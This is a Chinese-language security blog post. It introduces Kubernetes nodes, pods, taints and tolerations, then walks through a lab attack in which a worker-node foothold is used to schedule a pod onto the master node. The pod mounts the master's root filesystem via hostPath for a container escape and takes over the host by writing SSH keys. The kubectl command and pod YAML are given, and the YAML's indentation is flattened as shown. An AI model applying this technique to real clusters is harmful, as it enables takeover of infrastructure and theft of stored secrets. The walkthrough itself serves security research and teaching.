---
date: "2021-07-20T00:00:00Z"
description: Kubernetes (通常称为 K8s) 是来自 Google 云平台的开源容器集群管理系统，用于自动部署、扩展和管理容器化（containerized）应用程序。本文介绍获取了其中某个节点的宿主机权限，如何横向移动到Master节点，从而获取整个集群的权限。
title: Kubernetes(K8s)横向移动办法
url: /archivers/2021-07-20/1
---

> 博客半年没写了，来除除草.... :(

## 0x01 Kubernetes 简介

Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。

![2021-07-20-11-19-39](https://images.payloads.online/b3682bc6-4f5f-11ec-a3a0-00d861bf4abb.png)

**传统部署时代：**

早期，各个组织机构在物理服务器上运行应用程序。无法为物理服务器中的应用程序定义资源边界，这会导致资源分配问题。 例如，如果在物理服务器上运行多个应用程序，则可能会出现一个应用程序占用大部分资源的情况， 结果可能导致其他应用程序的性能下降。 一种解决方案是在不同的物理服务器上运行每个应用程序，但是由于资源利用不足而无法扩展， 并且维护许多物理服务器的成本很高。

**虚拟化部署时代：**

作为解决方案，引入了虚拟化。虚拟化技术允许你在单个物理服务器的 CPU 上运行多个虚拟机（VM）。 虚拟化允许应用程序在 VM 之间隔离，并提供一定程度的安全，因为一个应用程序的信息 不能被另一应用程序随意访问。

虚拟化技术能够更好地利用物理服务器上的资源，并且因为可轻松地添加或更新应用程序 而可以实现更好的可伸缩性，降低硬件成本等等。

每个 VM 是一台完整的计算机，在虚拟化硬件之上运行所有组件，包括其自己的操作系统。

**容器部署时代：**

容器类似于 VM，但是它们具有被放宽的隔离属性，可以在应用程序之间共享操作系统（OS）。 因此，容器被认为是轻量级的。容器与 VM 类似，具有自己的文件系统、CPU、内存、进程空间等。 由于它们与基础架构分离，因此可以跨云和 OS 发行版本进行移植。

> 以上摘自Kubernetes官方文档：https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/

## 0x02 Kubernetes 关键概念介绍

Kubernetes有如下几个与本文相关的概念：

1. 节点(Node)
2. Pod
3. 容忍度(Toleration)与污点(Taint)


### 节点(Node)

Kubernetes 通过将容器放入在节点（Node）上运行的 Pod 中来执行你的工作负载。 节点可以是一个虚拟机或者物理机器，取决于所在的集群配置。最容易理解的例子：

![2021-07-20-10-38-26](https://images.payloads.online/b3b30a38-4f5f-11ec-8073-00d861bf4abb.png)

该集群有三个节点，我可以在这三个节点上创建很多个Pod，而Pod中可以包含多个容器。在所有的节点中，至少要有一个Master节点，Master节点是第一个加入集群的机器，它具有整个集群的最高权限，本文的目的就是研究如何通过其他节点，横向移动到Master节点，因为Secret敏感信息(令牌、账户密码、公私钥等等)都存储在Kubernetes的etcd数据库上。

### Pod

Pod是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。

Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个） 容器； 这些容器共享存储、网络、以及怎样运行这些容器的声明。 Pod中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。 Pod所建模的是特定于应用的“逻辑主机”，其中包含一个或多个应用容器， 这些容器是相对紧密的耦合在一起的。 在非云环境中，在相同的物理机或虚拟机上运行的应用类似于 在同一逻辑主机上运行的云应用。

Pod的共享上下文包括一组 Linux 名字空间、控制组（cgroup）和可能一些其他的隔离方面，即用来隔离Docker容器的技术。 在Pod的上下文中，每个独立的应用可能会进一步实施隔离。

就Docker概念的术语而言，Pod类似于共享名字空间和文件系统卷的一组Docker容器，也就是说Pod是Docker容器的超集。


### 容忍度(Toleration)与污点(Taint)

Kubernetes可以约束一个 Pod 只能在特定的节点上运行。


节点亲和性 是Pod的一种属性，它使 Pod 被吸引到一类特定的节点 （这可能出于一种偏好，也可能是硬性要求）。 污点（Taint）则相反——它使节点能够排斥一类特定的 Pod。容忍度（Toleration）是应用于 Pod 上的，允许（但并不要求）Pod 调度到带有与之匹配的污点的节点上。**我们可以控制Pod创建时候的污点来向集群内的节点进行喷射创建。**


## 0x03 环境介绍

当前实验环境有三个节点，其中一个为Master节点，其余的都是普通节点。

![2021-07-20-10-56-11](https://images.payloads.online/b3ef7cfc-4f5f-11ec-984e-00d861bf4abb.png)

当前机器是node1，普通节点，节点全部为健康状态，接下来要利用创建Pod的功能，横向到k8s-master。


## 0x04 利用创建Pod横向移动

1. 确认Master节点的容忍度
   
```bash
$ kubectl describe node <Node Name>
```

![2021-07-20-10-59-50](https://images.payloads.online/b454933a-4f5f-11ec-a431-00d861bf4abb.png)

2. 创建带有容忍参数的Pod

```bash
$ kubectl create -f control-master.yaml
```

control-master.yaml内容：

```yaml
apiVersion: v1
kind: Pod
metadata:
name: control-master-3
spec:
tolerations:
- key: node-role.kubernetes.io/master
operator: Exists
effect: NoSchedule
containers:
- name: control-master-3
image: ubuntu:18.04
command: ["/bin/sleep", "3650d"]
volumeMounts:
- name: master
mountPath: /master
volumes:
- name: master
hostPath:
path: /
type: Directory
```

![2021-07-20-11-02-18](https://images.payloads.online/b4bba0de-4f5f-11ec-b260-00d861bf4abb.png)


在多次创建Pod后，会发现Pod会在Master节点上出现，再利用kubectl进入容器，执行逃逸。


![2021-07-20-11-06-24](https://images.payloads.online/b5136788-4f5f-11ec-9315-00d861bf4abb.png)

至此，逃逸完成，能够通过写公私钥的方式控制Master宿主机。

## 0x05 总结

本文通过了解Kubernetes的一些基本概念，完成了在节点中进行横向逃逸，但我没有实现指定节点的逃逸过程，因为在Kubernetes中低权限的节点无法修改Master节点的容忍度，因此要完成逃逸，需要在每一个节点上至少创建一个Pod，如果集群中节点数量庞大的话....